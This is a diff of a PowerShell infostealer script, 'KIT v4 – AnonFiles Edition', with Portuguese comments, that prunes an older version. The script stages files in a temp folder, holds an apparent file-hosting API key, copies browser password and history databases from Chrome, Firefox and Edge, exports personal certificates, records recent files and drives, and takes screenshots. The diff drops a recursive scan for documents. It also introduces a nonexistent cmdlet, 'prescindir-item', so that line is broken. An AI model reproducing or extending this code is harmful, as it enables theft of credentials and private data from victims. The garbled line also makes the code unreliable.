@@ -1,5 +1,5 @@
 # ----------
-# KIT v3 – AnonFiles Edition com logs detalhados
+# KIT v4 – AnonFiles Edition sem varredura de drives
 # ----------
 $kit     = "$env:TEMP\kit"
 $key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
@@ -40,9 +40,7 @@ Write-Log "[INFO] Copiando dados de navegadores..."
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
     "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
     "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
-) | ?{ Test-Path $_ } | %{
-    Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -EA SilentlyContinue
-}
+) | ?{ Test-Path $_ } | prescindir-item "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -EA SilentlyContinue
 
 # 5) Certificados
 Write-Log "[INFO] Exportando certificados pessoais..."
@@ -60,15 +58,9 @@ Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" |
     Select Name,LastWriteTime |
     Out-File "$kit\recent.txt" -Encoding UTF8
 
-# 8) Drives & top 500
-Write-Log "[INFO] Varrendo drives por arquivos interessantes..."
+# 8) Lista drives (apenas enumeração, sem varredura)
+Write-Log "[INFO] Enumerando drives..."
 Get-PSDrive -PSProvider FileSystem | Out-File "$kit\drives.txt" -Encoding UTF8
-$exts = @("*.pdf","*.doc*","*.xls*","*.txt","*.csv","*.db","*.sqlite","*.pst")
-Get-ChildItem C:\ -Include $exts -Recurse -Depth 2 -EA SilentlyContinue |
-    Select FullName,Length,LastWriteTime |
-    Sort Length -Descending |
-    Select -First 500 |
-    Export-Csv "$kit\top_files.csv" -NoTypeInformation
 
 # 9) Screenshot
 Write-Log "[INFO] Tirando screenshot..."
